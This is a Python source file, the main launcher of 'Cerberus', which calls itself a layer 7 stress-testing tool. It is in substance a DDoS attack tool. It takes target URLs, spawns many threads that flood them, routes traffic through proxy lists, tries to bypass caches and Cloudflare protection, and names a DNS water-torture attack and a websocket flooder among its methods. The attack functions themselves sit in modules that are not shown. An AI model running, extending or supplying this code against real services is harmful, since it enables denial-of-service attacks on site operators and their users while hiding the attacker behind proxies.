'''

Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

'''

# import all non-stdlib modules, just to check if they are actually installed
try:
    from requests.cookies import RequestsCookieJar # for sending the actual requests
    from colorama import Fore, init # fancy colors :O
    import cloudscraper, selenium, undetected_chromedriver # cloudflare bypass
    import argparse # needed for command line argument parsing
    import tabulate # pretty tables
    import dns.resolver # dns watertorture attack
    import websocket # websocket flooder
except Exception as e:
    print(' - Error, it looks like i\'m missing some modules. Did you try "pip install -r requirements"?')
    print(f' - Stacktrace: \n{str(e).rstrip()}')
    exit()

# import the standard library modules, should have no problems importing them
try:
    import sys # checking the python version
    import urllib # url parsing
    import threading # threaded attacks
    import json # parsing json, and creating json objects
    import time # delay between attacks and time calculation
    from random import choice # picking random stuff
    import netaddr # stuff with ip addresses
    import sqlite3 # database
    import textwrap # for the argparser module
    import ssl # secure socket layer stuff
    import asyncio # asynchronous stuff
    from timeit import default_timer as timer
    from http.client import HTTPConnection # setting the "HTTP/" value
    from urllib3.exceptions import InsecureRequestWarning # to disable that annoying "Insecure request!" warning
except Exception as e:
    print(' - Error, failed to import standard library module.')
    print(f' - Stacktrace: \n{str(e).rstrip()}')
    exit()

if sys.version_info[0] < 3 and sys.version_info[1] < 6:
    sys.exit(' - Error, please run Cerberus with Python 3.6 or higher.') # now that we've import sys, we can exit and print with a single function, awesome!

# import all custom modules from the "src" directory
try:
    from src.utils import * # import all utilities
    from src.core import * # import the "bridge", basically used to store variables editable by all core modules
    from src.database import * # database stuff
    from src.argparser import *
    from src.methods import *
except Exception as e:
    print(' - Error, failed to import core modules.')
    sys.exit(f' - Stacktrace: \n{str(e).rstrip()}')

# initialize colorama
init(autoreset=True) # makes it so i don't need to do Fore.RESET at the end of every print()
urllib3.disable_warnings(InsecureRequestWarning) # disables the warning

utils().print_banner()
if len(sys.argv) <= 1: # no arguments? just show all logs

    if len(database().get_logs()) == 0:
        print('\n - No running attacks.')

    else:
        print('\n' + utils().table(
            [(row['timestamp'], row['identifier'], row['target'], row['attack_vector'], row['bypass_cache']) for row in database().get_logs()], 
            ['Timestamp', 'ID', 'Target', 'Method', 'Bypass cache?']
        ))

    print(f'\n\n + To view the commands, try this: python3 {sys.argv[0]} -h')
    print('\n + Tip: you can easily re-launch an attack by using the ID like this:')
    print(f'python3 {sys.argv[0]} --launch-from-id <attack id here>\n')

else: # parse the arguments with argparse

    parser = ArgumentParser(width=100, description='''Cerberus is a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
It's written in Python3 and is usable on all systems with Python installed.''',
                            epilog='''Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
''', argument_default=argparse.SUPPRESS, allow_abbrev=False)

    # add arguments
    parser.add_argument('-t',       '--target',          action='store',      dest='target_url',    metavar='target url',   type=str,    help='Target url(s) to attack, seperated by ","', default=None)
    parser.add_argument('-d',       '--attack-duration', action='store',      dest='duration',      metavar='duration',     type=int,    help='Attack length in seconds', default=100)
    parser.add_argument('-w',       '--workers',         action='store',      dest='workers',       metavar='workers',      type=int,    help='Number of threads/workers to spawn', default=40)
    parser.add_argument('-m',       '--method',          action='store',      dest='method',        metavar='method',       type=str,    help='Attack method/vector to use', default='GET')
    parser.add_argument(            '--proxy-file',      action='store',      dest='proxy_file',    metavar='location',     type=str,    help='Location of the proxy file to use', default=None)
    parser.add_argument(            '--proxy-proto',     action='store',      dest='proxy_proto',   metavar='protocol',     type=str,    help='Proxy protocol (SOCKS4, SOCKS5, HTTP)', default='SOCKS5')
    #parser.add_argument(            '--driver-engine',   action='store',      dest='driver_engine', metavar='driver engine',type=str,    help='Driver engine to use (CHROME for Chrome, GECKO for Firefox)', default='CHROME')
    parser.add_argument('-logs',    '--list-logs',       action='store_true', dest='list_logs',                                          help='List all attack logs', default=False)
    parser.add_argument('-methods', '--list-methods',    action='store_true', dest='list_methods',                                       help='List all the attack methods', default=False)
    parser.add_argument('-bc',      '--bypass-cache',    action='store_true', dest='bypass_cache',                                       help='Try to bypass any caching systems to ensure we hit the main servers', default=True)
    parser.add_argument('-y',       '--yes-to-all',      action='store_true', dest='yes_to_all',                                         help='Skip any user prompts, and just launch the attack', default=False)
    parser.add_argument(            '--http-version',    action='store',      dest='http_ver',      metavar='http version', type=str,    help='Set the HTTP protocol version', default='1.1')
    args = vars(parser.parse_args()) # parse the arguments

    if args['list_logs']:

        if len(database().get_logs()) == 0:
            print('\n - No running attacks.')

        else:
            print('\n' + utils().table(
                [(row['timestamp'], row['identifier'], row['target'], row['attack_vector'], row['bypass_cache']) for row in database().get_logs()], 
                ['Timestamp', 'ID', 'Target', 'Method', 'Bypass cache?']
            ))

        print('\n\n + Tip: you can easily re-launch an attack by using the ID like this:')
        sys.exit(f' + python3 {sys.argv[0]} --launch-from-id <attack id here>\n')
    
    if args['list_methods']:
        print('\n')

        for method, items in Core.methods.items():
            print(f'{method}: {items["info"]}')

        sys.exit('\n')

    if not args['target_url']: # check if the "-t/--target-url" argument has been passed
        sys.exit('\n - Please specify your target.\n')
    
    if ',' in args['target_url']: # multiple targets specified
        Core.targets = args['target_url'].split(',')
    else:
        Core.targets = [args['target_url']]

    attack_method = args['method'].upper()
    if not Core.methods.get(attack_method): # if the method does not exist
        sys.exit(f'\n - Error, method "{attack_method}" does not exist.\n')
    
    Core.bypass_cache = args['bypass_cache']
    Core.proxy_proto = args['proxy_proto']
    #Core.driver_engine = args['driver_engine']

    if args['proxy_file']:
        Core.proxy_pool = []
        if not os.path.isfile(args['proxy_file']):
            sys.exit(f'\n - Error, "{args["proxy_file"]}" not found\n')
        
        with open(args['proxy_file'], buffering=(2048*2048)) as fd:
            [Core.proxy_pool.append(x.rstrip()) for x in fd.readlines() if bool(re.match(r'\d+\.\d+\.\d+\.\d+', x))] # sadly no ipv6 supported (yet)
        
        if Core.proxy_pool == []:
            sys.exit(f'\n - Error, no proxies collected, maybe wrong file?\n')
    
    print(' + Current attack configuration:')

    if not Core.targets:
        print(f'   - Target: {args["target_url"]}')
    else:
        print(f'   - Targets: {", ".join(Core.targets)}')

    print(f'   - Duration: {utils().Sec2Str(args["duration"])}')
    print(f'   - Workers: {str(args["workers"])}')
    print(f'   - Method/Vector: {args["method"]}')
    print(f'   - Cache bypass? {str(Core.bypass_cache)}')
    print(f'   - HTTP protocol version: {str(args["http_ver"])}')

    if args['proxy_file']:
        print(f'   - Proxies loaded: {str(len(Core.proxy_pool))}')
        print(f'   - Global proxy protocol: {str(Core.proxy_proto)}')

    if not args['yes_to_all']:
        if not input('\n + Correct? (Y/n) ').lower().startswith('y'):
            sys.exit('\n')

    print('\n + Creating unique identifier for attack')
    attack_id = utils().make_id()
    Core.infodict[attack_id] = {'req_sent': 0, 'req_fail': 0, 'req_total': 0}

    # before we create the session, we need to set the HTTP protocol version
    HTTPConnection._http_vsn_str = f'HTTP/{args["http_ver"]}'

    print(' + Creating requests session.')
    session = utils().buildsession()
    Core.session = session

    if not args['yes_to_all']:
        input('\n + Ready? (Press ENTER) ')

    Core.bypass_cache = args['bypass_cache']

    print('\n + Building threads, this could take a while.')
    stoptime, threadbox = time.time() + args['duration'], []
    for _ in range(args["workers"]):
        try:
            kaboom = threading.Thread(
                target=Core.methods[attack_method]['func'], # parse the function
                args=(
                    attack_id, # attack id
                    choice(Core.targets), # pick a random target from the list
                    stoptime, # stop time
                )
            )
            
            threadbox.append(kaboom)
            kaboom.start()

        except KeyboardInterrupt:
            Core.attackrunning = False
            Core.killattack = True
            sys.exit('\n + Bye!\n')
        
        except Exception as e:
            print(f' - Failed to launch thread: {str(e).rstrip()}')
    
    print('\n + Starting attack')
    Core.attackrunning = True # all threads have launched, lets start the attack

    s_start = timer()
    while 1:
        try:
            utils().clear()

            sent = str(Core.infodict[attack_id]['req_sent'])
            failed = str(Core.infodict[attack_id]['req_fail'])
            total = str(Core.infodict[attack_id]['req_total'])

            print(f' + Target(s): {", ".join(Core.targets)}')
            print(f' + Sent: {sent}')
            print(f' + Failed: {failed}')
            print(f' + Total: {total}')

            time.sleep(2)

        except KeyboardInterrupt:
            Core.attackrunning = False
            Core.killattack = True
            break
    
    utils().clear()
    print(' + Killing all threads, hold on.')
    for thread in threadbox:
        thread.join()
    s_took = "%.2f" % (timer() - s_start)
    
    print(' + Threads killed')
    
    sent = str(Core.infodict[attack_id]['req_sent'])
    print(f' + Average Requests Per Second: {str(float(sent)/float(s_took))}')
    print(' + Attack finished.')